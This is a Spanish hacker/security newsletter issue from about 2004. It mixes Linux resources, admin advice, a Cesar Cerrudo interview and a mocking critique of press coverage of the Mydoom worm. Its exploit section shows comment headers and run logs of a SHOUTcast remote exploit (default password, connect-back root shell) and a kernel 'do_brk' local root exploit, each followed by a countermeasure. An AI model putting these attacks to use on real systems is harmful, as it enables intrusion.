
NNL º18   Que se avecinen las vecinas...

1) Sitios: Linux, usa linux, comienza con linux.
2) Pequeños grandes consejos al futuro admin
3) Mini Analisis de xploits privados ( no públicos )
4) Algo de feedback interesante
5) Guninski de las pampas: Cesar Cerrudo | Dialogo ( 1ra parte )
6) Analizando notas informáticas escritas por gente no informática.
7) N de la R. ( Notas de la Redacción )

..................................

1) http://es.tldp.org                TLDP-ES/LuCAS

Si aun no lo hiciste, es un buen momento para comenzar
con linux. hay mas de 10 razones como para hacerlo y no
precisamente por compararlo con otro sistema operativo,
sino porque el futuro esta en linux. Gratis, de una
versatilidad impresionante, el limite al jugo que puede
sacarsele a este sistema es proporcional a la capacidad
de logica y curiosidad que tenga cada uno de sus
usuarios. Todos sus documentos en español.

Para los que estan algo mas avanzados o administran >

http://www.brandonhutchinson.com

- Sitio de un admin de Minneapolis, que apunta lo que
soluciona en sus maquinas.... -

( Hay dos pequeños errores en el texto sobre como
compilar dsniff-2.3 en un red hat 9, uno es cambiando
la version de libnids a la 1.18 y por ultimo arreglar
la ubicacion de dsniff.services )

El resto de los apuntes no tiene desperdicio.

..................................

2) Pequeños grandes consejos al futuro admin
Una vez que estes como administrador de una red continua
estudiando, participa de seminarios o bien en grupo
con tus mismos compañeros de trabajo u amigos viendo
nuevas formas de proceder ante supuestos incidentes,
estar previniendo y cultivandose es lo mejor.
No hay que hacer como estos chicos que se reciben de
analistas, van con el titulo a una empresa y se quedan
ahi rascandose haciendose llamar "administrador de
sistemas" mientras tienen un nido de kiddies en sus redes
y estas boxes a su vez andan al 35% ...
Esos pseudos admins son los que vemos luego pidiendo a
gritos ayuda en foros, listas de correo y MSN, son
sinonimo de incidentes.
Siempre recuerden, el incidente esta dado el 99% por un
simple intruso que aprovecho el descuido y desconocimiento
de un administrador mediocre e inmotivado.
--------------------

3) Mini analisis de exploit privados: Hoy servers de
musica tipo "SHOUTcast" y uno freaky para Kernel linux

# Remote exploit for SHOUTcast.
#
# Functions StartListener, Unblock and StartShell riped
from tran2root.pl, made
# by H D Moore <hdmoore@***.net>.
# Some parts taken from http://www.metasploit.com/tools/
Pex.pm too.
#
# [+] Using target v1.9.2 Linux Universal Target
# [+] Using pass "changeme"
# [+] Trying to login... D0ne!
# [+] Listener started on port 6969
# [+] Sending our stuff... DOne!
# [+] Wait for connectback shell...
#
# [+] Starting Shell 192.168.0.1:33074
#
# ****** Welcome to 'localhost.localdomain' ******
#
# Linux localhost.localdomain 2.4.21-0.13mdk #1 *** 15
# unknown unknown GNU/Linux
# uid=0(root) gid=0(root) groups=0(root)
#
######################################################

Solución o contramedida: No hay mucho por recomendar
sino mas que asignar un password diferente al servicio
apenas se instala y por otro lado no dar a conocer el
nuevo por nada. Esta falla, esta en la ultima version
inclusive.

------------8<
/*
0day;)
Modified do_brk(); exploit, that works on SMP hosts.
Modified by Kazak. Tested by L0rda.

sh-2.05a$ ./leet2
sh-2.05a# uname -r -s
Linux 2.4.20-19.7smp
sh-2.05a$ ./leet2
sh-2.05a# uname -r -s
Linux 2.4.18-14smp
------------8<

Solución o contramedida: Patchear el kernel a la ultima
release o adoptar parches que den una mayor seguridad tipo
los de http://www.grsecurity.org/download.php
En K-otic hay un PoC ( proof of concept exploit ) para la
ultima falla de kernel pero no es muy funcional.

ººººººººººººººººººººººººººººººººººººººººººººº

4) Algo de feedback interesante.

On Thu, 19 Feb 2004 09:20:15 -0800 =?iso-8859-1
t7XJleiBNb3Jlbm8=?= <jaime_ramirez74@****.com> wrote:

hola , gracias por tus comentarios y recomendaciones podrias
enviarnos algo si sabes donde bajar o localizar en source
code de windows 2000 and NT, que esta circulando por la red
en especial en Kazaa, pero hay un buen de archivos cual sera
sera el bueno? Un saludo

R:> Mira, no quiero tener problemas con la gente de Microsoft
Argentina, inclusive hay aqui lectores de esa firma, asi que
no puedo decirte de donde sacarlos directamente ni puedo decir
que los baje porque me van a intimidar tal como anunciaron.
Hace algun tiempo estan ahi afuera. Disponible al publico hay
parte de la beta de XP, W2k y NT completos.
Hoy por hoy no es un secreto, si te fijas en las redes p2p los
tenes todos... pero bueno, mi conocimiento de assembly/C es
pobre y mi tiempo tan escazo que ni me interesa (o puedo!)
ponerme a revizar codigo ajeno, mas de una plataforma que
considero obsoleta como ser NT.
Entendes ? por otro lado mi logica es primero preguntarme:
para que puedo querer eso ? para andar diciendo que lo tengo ?
:) no... quiza a los 18 años si lo hacia.
Cambiando de tema y para tu conocimiento, Microsoft dio source
a muchos lugares, organizaciones del tipo educacion, inteli-
gencia, juridicas, de manufactura, periodisticas ( prensa
especializada en informatica ) y quien sabe a que mas...
esta clase de apertura comenzo en el 2000
http://www.microsoft.com/resources/sharedsource/default.mspx
Si bien no te va a dar su nucleo, si queres o estas capacitado
para desarrollar una aplicacion seria cuestion de ver hasta que
punto pueden colaborar con vos o tu empresa para hacer tu
desarrollo como corresponde.
Era de esperar este tipo de filtracion, miles y miles de
empleados es mucho... imposible controlar ese monstruo, sus
mails, las cosas que se llevan a casa en sus laptops, imaginate.
O no te acordas de la vez que compraron Viagra con la tarjeta
de Bill Gates y se lo mandaron a su casa ? todo se filtra, solo
es cuestion de tiempo y un puñado de empleados despedidos o
enojados. Saludos.

Copyright (c) Microsoft Corporation

ººººººººººººººººººººººººººººººººººººººººººººº

Dialogo distendido con Cesar Cerrudo
via MSN. 1ra parte.

http://www.google.com.ar/search?hl=es&ie=UTF-8&oe=UTF-8&q=cesar+cerrudo&btnG=B%C3%BAsqueda+en+Google&meta=

Mini Bio: Vive en Paraná, Argentina.
Desarrolla programas para auditoria de aplicaciones
en una empresa de EEUU y entre otras cosas en su
tiempo libre lleva adelante la lista de seguridad de SQL
http://groups.yahoo.com/group/sqlserversecurity/ y
participa de seminarios disertando.

"Cesar Cerrudo is a independent security researcher
/consultant specialized on application security.
In the latest years he has found many vulnerabilities
on top software such as MS SQL Server, MS Biztalk Server,
MS Commerce Server, MS Windows 2000, Oracle database
server, Yahoo! Messenger, etc. He has presented about
SQL Server security at Black Hat and Microsoft in the
last year."

----------------8<

NNL says: Como empezaste con esto de hacer research en
cuanto a vulnerabilidades ?

Cesar says: Siempre me gusto el tema del hacking, pero no
tenia plata o sea no tenia compu, no internet, etc...
...nunca me di por vencido y leia libros viejos aunque no
tenia a veces como probar nada... te hablo desde que empece
a estudiar informatica, lo que pasa es que despues como no
tenia recursos anduve de vago por varios años
anduve de joda, dejando el estudio ...realmente con
seguridad informatica empece hace como tres o cuatro años
en serio, fue cuando tuve una compu y algo de acceso a
internet... ...empece a interiorizarme del tema y a probar
cosas tipo kiddie , pero como a la vez estudiaba informatica
tomaba mas en serio las cosas...

NNL says: Es que es asi, todos los humanos pasamos por
periodos de evolucion o involucion :))

Cesar says: ...por suerte no me enganche con la onda kiddie
ya que te lleva por mal camino, es decir a hacer cosas sin
saber porque o como funcionan, etc.... ....empece a ver de
que se trataban las vulnerabilidades, a hacer mis propios
programas para explotar vulnerabilidades, y me di cuenta de
que con el conocimiento necesario y con perseverancia no era
algo imposible meterse en el tema... ...me gustaria contar
algunas aventuras de mis comienzos pero no tengo ganas de
ir preso ...

NNL says: No, eso no se cuenta nunca... aparte la gente no
lo ve como diversion, como un desafio intelectual sino como
un acto delictivo y hasta malefico (?¿)

Cesar says: Cierto.

NNL says: Que tuviste que estudiar para llegar a descubrir
fallas en aplicaciones de microsoft como por ejemplo SQL ?

Cesar says: ....yo conocia SQL Server ya que programaba
applicaciones cliente servidor, entonces vi que publicaban
fallas en SQL y empece de a poco a probar y buscar...
...no tuve que estudiar, ya sabia cuales eran las fallas mas
comunes, overflows, etc... ...segui probando hasta que
encontre mi primer overflow ...

NNL says: Pero algo tenes que estudiar para explotar eso,
que leiste que recuerdes ?

Cesar says: ...bueno, descubrir una falla y explotarla a
veces es distinto, ya que si se trata de un overflow tenes
que codear un exploit... ...para eso necesitas aprender
assembler(yo ya sabia algo) y como codear exploits, que es
bastante dificil aprender solo sin que nadie te ayude...
...al principio solo me dedicaba a buscar vulnerabilidades y
no codeaba exploits ya que no sabia, despues empece a aprender...
...pero para mi lo mas entretenido es encontrar las
vulnerabilidades... ...tambien esta bueno codear exploits pero
cuando son interesantes...

NNL says: Y bueno, la pregunta que los lectores quisieran
hacerte, como es una etapa de research ? como te pones por
ejemplo a encontrar una falla en determinada aplicacion ? o sea,
hay alguna tecnica en especial ? se hace a mano o de modo
automatizado ?

Cesar says: ....prefiero manual, por ahi podes hacer algo
automatico pero de todas maneras nunca podes confiar 100% en los
tools... ...siempre tenes que revisar manualmente para estar
seguro....

NNL says: Horas y horas entonces analizando el output de todas
las porquerias que le metas a mano...
( que opinion profesional, en cualquier momento me llaman para
escribir en la 2600 )

Cesar says: ...cada uno tiene su tecnica, y por ahi yo pienso
que tengo un 6to sentido(sera experiencia tal vez ?, no se) ya
que a veces voy directo y encuentro algo...
...a veces te puede llevar horas encontrar algo, lo principal
es no deseperanzarse....
...a veces cuando no encontras nada enseguidad es desalentador,
pero hay que seguir...

NNL says: Dame un top 5 de las fallas que encontraste mas
relevantes, que recuerdes...

Cesar says: ...hay muchas fallas, mi favorita es un error de
diseno de SQL Server, ya que es una falla logica las cuales son
mas dificiles de encontrar... ...basicamente la falla consistia
en que cualquier administrador de una base de datos (db_owner)
se podia convertir en administrador de SQL Server...
...habria que hacer una explicacion mas larga y entendible,
pero bueno ...

NNL says: No hay problema, es una entrevista asi muy por arriba,
media tecnica, media distendida, tipo bar...

NNL says: Cierta vez hablamos en privado sobre como estaba el
tema aqui en empresas y sus databases online, que porcentaje
calculas que se encuentran buggies ? homebanking/ecommerce/etc

Cesar says: ...la situacion de Argentina es deplorable, yo diria
que 90% de los servers conectados a internet tienen pesimas
seguridad.... ...en Argentina el que pone sus datos personales
online esta loco ...

NNL says: Si, seguro, pena que ya las databases ya estan dando
vueltas por todos lados, cualquier papanata vende datos aqui y
a nadie le importa.

Cesar says: ...hay bases de datos de grandes empresas(mejor no
las mensiono) que son casi publicas...

NNL says: Pero es la verdad. Habria que hacer una ley para eso
no ? el admin descuidado que vaya preso por exponer los datos
jaja He visto databases a la intemperie y es para llorar.

Cesar says: ...no se si el admin pero la empresa es la
responsable... ...hay empresas que tienen sector de seguridad
informatica, pero no tienen idea, la gente del sector por lo
general se la pasa instalando antivirus, etc. y descuidan los
aspectos mas importantes...

NNL says: Podriamos estar chateando horas sobre empresas...
hay gente ahi trabajando ( bue.. ) que no se que hace en
realidad... me gustaria dar anecdotas y nombres o bien nombres
de empresas pero seria escupir para arriba. Ni hablar de los ISP.

Cesar says: Si, yo soy de mandarme y dar nombres pero todo
tiene su momento.

NNL says: Me cure de espanto en su momento... he reportado
cientos de servidores con fallas, gane muchos amigos, como de
los otros, y nunca mas, ahora solo aviso si realmente hace
falta, si vale la pena...

Cesar says: Yo tambien me canse de eso, ahora no reporto nada
que se jodan

NNL says: Si, que se curtan solos...  no pierdo mas tiempo.

Cesar says: Si

NNL says: Donde fuiste ultimamente a dar algun speech ? backhat
2004 y donde mas ?

Cesar says: ...este año fui a Black Hat Windows 2004, y el año
pasado tambien, tambien fui invitado por Microsoft para dar una
charla en el campus...

( Aqui tienen los archivos de media para ver el material sobre el
que disertó. >
http://www.blackhat.com/presentations/win-usa-04/bh-win-04-cerrudo/bh-win-04-cerrudo.pdf
http://www.blackhat.com/presentations/win-usa-04/bh-win-04-cerrudo/bh-win-04-cerrudo-examples.zip )

NNL says: Conociste al grupo developer de SQL ?
te quisieron tentar o reclutar ?

Cesar says: ...Si conozco bastante gente de Microsoft y si me
quisieron reclutar... ...pero no acepte, prefiero mi pais y
trabajar desde aca...

NNL says: Buenos researchers que conozcas ?

Cesar says: ...David Litchfield y sus companieros(lo conoci, buen
vago), Eeye, muchos otros.

NNL says: Para cuando le vas a entrar a IIS ? perdiste algunas
horas buscandole issues ?

Cesar says: ...al principio cuando recien empezaba pero todo lo que
encontre ya habia sido descubiero, recientemente encontre algo
relacionado con IIS pero no es gran cosa, IIS ha sido auditado
hasta el cansancio, siempre quedan cosas pero se necesita tiempo
y yo no me dedico full time a auditar...

NNL says: Alguna primicia que quieras dar a los lectores de NNL
sobre alguna falla por publicarse ?

Cesar says: La primicia que te puedo dar .... es que estoy viendo
Oracle y es una gran porqueria llena de bugs, o sea que la gente
que usa Oracle tiene instalado un backdoor. Eso publicalo, los
de Oracle son una *****!

NNL says: jaja Conozco gente que lo usa y lee esto, como se van
a poner... un importante holding usa decenas de esas online
y sus gerentes de sistemas leen NNL.

Cesar says: ...el security response team de Oracle, es la gente
mas irresponsable e incapaz que haya conocido, no se puede creer!!!
...lo mas lindo es que Oracle vende su producto como unbreakable...
...jajaja, que joda a sus clientes...

NNL says: Es lo que sostengo siempre, cuando un departamento de
marketing supera al trabajo de desarrollo ya es un problema para
sus clientes, su futuro y para los potenciales engañados...
porque les venden cualquer cosa... no solo ellos, otros tantos
prometen el paraiso y venden porquerias...

Cesar says: ....si el tema de desarrollo y venta de software es un
tema complicado, la finalidad es siempre vender y hacer plata,
todo lo demas pasa a segundo plano...

NNL says: Exacto, y no soy para nada condescendiente.

Cesar says: ...hay empresas que se ponen las pilas cuando ven su
negocio amenazado como ser Microsoft... ...que en los ultimos años
se ha puesto las pilas respecto a seguridad...

( *** "Se ha puesto las pilas" es un regionalismo argentino ( slang )
que significaria en este caso: tomó conciencia del caso. )

NNL says: ... puedo describir los CEOs mas tristes esta noche....

Cesar says: :)

NNL says: Si, ahora con el SP2 de XP y las auditorias completas de
codigo se pasaron... estan poniendole empeño.... eso porque el boca
a boca les esta jugando en contra con el marketing.... mientras linux
a crecido del 92´ hasta ahora a pasos agigantados.

Cesar says: ...si creo que es la unica empresa que realmente a
tomado en serio el tema....

Seguirá en la NNL º19

----------------------------------8<

6) Analizando notas informáticas escritas por gente no informática.

Leyendo acostado como acostumbro a hacerlo los sabados por
la tarde, me encuentro con una nota acerca del Mydoom muy
particular: el autor escribio en prosa cuasi fantastica
acerca de dicho worm y realmente me causo mucha gracia.
Paso a tipearles textualmente la nota y de paso para hacer
gala de un poco de humor acido de fin de semana, opinare
entre lineas. ( > )

Mydoom / "El juicio final" por Sebastian Catalano
[ Revista Noticias pagina 79 edicion nro 1414 ]
www.noticias.uol.com.ar

En menos de dos dias, el virus informatico Mydoom infecto
100 millones de e-mails.

> Bueno, aqui hay un error de gramatica o bien el autor no
entiende absolutamente nada. Deberia decir - teniendo en
cuenta de que ese dato sea correcto - "...el virus
informatico mydoom se replico en 100 millones de mails
usando la propia pc infectada como servidor para envio de
correo y propagación..."

El gusano en cuestion logro el record de propagacion y
promete seguir dando vueltas por el ciberespacio, en
versiones mas refinadas y peligrosas.
Su objetivo final ? "Destruir" a Microsoft y a SCO, una
empresa que se opone al sistema gratuito Linux.

> Me imagino, destruccion total, apocalipsis, millones de
aviones estrellandose en Redmond y mails con cabeza
nuclear pululando derecho por la red hasta dar con la
casilla privada de Bill Gates. Me recuerda ya al efecto
2000 y todas las barbaridades que escribieron acerca del
tema gente que jamas encendió una pc.

Sus armas ? Las millones de computadoras conectadas a
internet.

> W00w00w estan todas infectadas ? hooooooooly shit!
"...te dije quinientas treinticuatro mil trillones de
veces que no soy exagerado!..."

Aunque los discos duros quedaran esta vez a salvo, los
"justicieros" creadores de Mydoom utilizaran a todos
los usuarios del mundo para disparar e-mails infectados
a sus dos targets, de modo de bajarlos del mapa.

> Gran error, en el caso de llamar eso un "ataque" ( me
da miedito la palabra esa ) no es de esa forma en el que
se la llevara a cabo. Entre el 1 de febrero y el 12 si
mal no recuerdo, las pcs infectadas enviaran una
secuencia de peticiones http ( GET ) hacia el sitio
institucional de SCO y la variante "b" del gusano lo hara
a la de Microsoft. Y eso de "todos los usuarios del
mundo...." es de cine fantastico.

Una verdadera protesta ciberprotesta anti-globalizacion
que, como los piquetes, ya genero un caos de trafico y
un debate sobre la etica de usar a inocentes como medio
de conseguir un fin justo.

> 1- Protesta ? es diversion :) just fun. Si quisieran
destruir algo harian alguna variante del CIH o algo que
borre archivos de sistema o bien todos los datos de modo
seguro e irrecuperable. La gente que hace este tipo de
cosas tiene un humor muy loco, se mofan del usuario tipico
ya que, no se olviden, recien ahora internet es masivo...
antes eran algunas redes y un puñado de BBS en las que
solo "los loquitos de la computadora" del barrio
frecuentaban. Y por si fuera poco dan dinero y trabajo a
tres grupos fundamentales: a consultores IT, a medios de
comunicacion y a las corporaciones de software como
Symantec. En este caso se mofan de MS y SCO... sus
autores deben ser koreanos o chinos de entre no mas de
18 y 25 años. 2- Relacionar piquetes con worms ? no es
muy mucho ? jesus... 3- Inocentes son los que creen en
este tipo de notas, por otro lado, que etica hay en una
editorial que le vende al lector una nota 100% falaz ?
Habra miles de inocentes de seguro, ya que crean el
contenido o no, al leerla ya esta paga la revista.

Mutante. Mydoom - tambien conocido como Novarg, Shimg y
Mimail.R - llega via el correo electronico y las
populares redes "pear to pear", como Kazaa, el programa
de intercambio gratuito de musica y videos. A diferencia
de muchos antecesores, no causa daño directo en las pcs
que infecta, pero las utiliza para propagarse
automaticamente. Como un pokemon, Mydoom evoluciona y
genera versiones mas sofisticadas.

> No, yo creo que es asi: un Mydoom hembra y un Mydoom
macho se encuentran en un Windows 98 y este ultimo pone
una semillita en esta Mydoom hembra. La Myddom hembra
luego de dar a luz un Mydoom"b", deletea al macho, y
en estos dias de lluvia se espera una version "c",
supuestamente tántrica.

El nuevo Mydoom.B , por ejemplo puso en su mira a los
gigantes de la industria informatica. Entre el 1 y el 12
de febrero se dispararan e-mails desde todas las maquinas
infectadas hacia los servidores web de SCO y el sitio de
Microsoft.

> No dispararan nada a los sitios, no tienen Uzis 9mms
en su poder... haran peticiones http a los sitios como
explique arriba... no le mostraste la nota a ningun
especialista ? no consultaste a nadie ? :) como van a
disparar mails a los sitios ? un mailbombing - miedito
again - a la casilla del webmaster ? jajaja

Desesperado, el grupo SCO ofrece una recompensa de 250.000
dolares a quien de pistas firmes sobre los creadores de
Mydoom, y ya dio de baja su sitio. Microsoft no hizo
comentarios.

> Bueno, en SCO no estan desesperados, un humano tan
simple como un admin puede lidiar con eso que le va a
suceder al server de el sitio, en las politicas de
corporaciones gestos como ese traen apareados otro tipo
de fines, como por ejemplo saber si eso no fue un juego
de estrategia comercial desde otra corporacion, luego
demostrar que "luchan" en contra de ese tipo de cosas y
a su vez desalentar posteriores intentos... hay muchos
intereses y las mejores investigaciones sin dudas seran de
oficio y en este caso de el FBI o Interpol.
Microsoft hizo comentarios, ofrecio una suma similar,
podria ofrecer 10 millones y mas... lo hacen solo para
desalentar, pero no creo que algo asi los preocupe
realmente.

"Parece una protesta simbolica. El ataque a los sitios
no fue sorpresivo. Ademas, el virus no se reenvia a
e-mails con direcciones de organismos educativos".
comenta Carolina Di Mitrio (29), de la empresa Nextvision.

> Si, es un juego, es una burla de joven/es geeks a esas
empresas y al grueso de los usuarios. Si quisieran hacer
realmente daño, harian algo desastroso y lamentable.
Saludos a Nacho de esa empresa.

De todos modos nos advierten los expertos, conviene
actualizar el antivirus y no abrir los attachmets
desconocidos. Si el virus se infiltra, puede que el
usuario no lo note. Pero cualquier hacker tendra la puerta
abierta para espiar.  - Fin -

> Hacker ? estimado autor, el hacker no es un niño que
juega con una pc de usuario, o el que deforma un sitio
porque si o el que tiene una pagina gris oscura o negra
con letras verdes c/ calaveritas girando.... y ezkriv3
t0d0 azi c0m0 t4r4d0. El hacker es un curioso intelectual
de continua formacion, que aporta a la comunidad tecnologica
mucho mas de lo que algunos creen, y por otro lado alguien
que se mete en un equipo ajeno ( ya sea server o pc hogareña )
es un simple y llano "intruso".
"hacker" es un termino mal utilizado en los medios, sin dudas.

( **Esta nota fue leida y contestada hace semanas.
Menos mal que este autor no redactaba en la epoca del CIH
sino se suicidaba online frente a una webcam. )

-----------------------------------------

7) N de la R. ( Notas de la Redacción )

Bueno, NNL is back! again. Estoy contento. Con mas tiempo,
mas ganas. Bueno, esta salio media desprolija - cumpli con
la fecha al menos - pero interesante, va a salir mejor
pero necesito su ayuda.
A continuacion les comento que otras secciones tengo en mente
para ir dandole forma a la nueva serie de boletines, mas completos,
mucho mas interesantes.
* Seccion para estudiantes de sistemas: Una especie de feedback,
en el que escriban los estudiantes de sistemas de diferentes partes
de america y europa ( hispanoparlantes ) y que nos cuenten como es
alli la carrera, virtudes y defectos de la institucion o la carrera.
Recomendaciones y consejos a futuros/actuales estudiantes.
Pueden escribir contandonos...
* Seccion tecnologica y telecomunicaciones: Ya hay gente que va a
colaborar con pequeñas notas sobre nuevas tecnologias, Celulares,
Wireless, Voip y más. Si alguien es un experto o se las ingenia en
uno de estos rubros puede aportar.
* Boletin en ingles: Se postularon 16 traductores de ingles
americano para NNL, saldra su version en ingles.
* Entrevistas interesantes: O dialogos, como aqui reproduje parte
de uno con Cesar Cerrudo, hay una entrevista ( muy lenta ) con
Adrian Lamo en estos dias y espero que escriban a ver quien quieren
que sea entrevistado.

Para hacer semejante newsletter se necesita tiempo y esfuerzo por
eso se publicara mensualmente, quiza con algunos offtopic
intermedios. Espero que lo hayan disfrutado.
Hasta la proxima, y buen fin de semana. C

* NNL º18 > Dedicado a los 10 años del Magazine HBO que tanto me
hizo reir en epocas de BBS. Duele no ser anónimo para hacer una
similar. :) vasha zdarovia!

_________________________________________________________________________ 
Preguntas, sugerencias, ofertas de trabajo, donaciones, sponsors, notas, 
contribuciones, dirigirse a: soporte@gmail.com 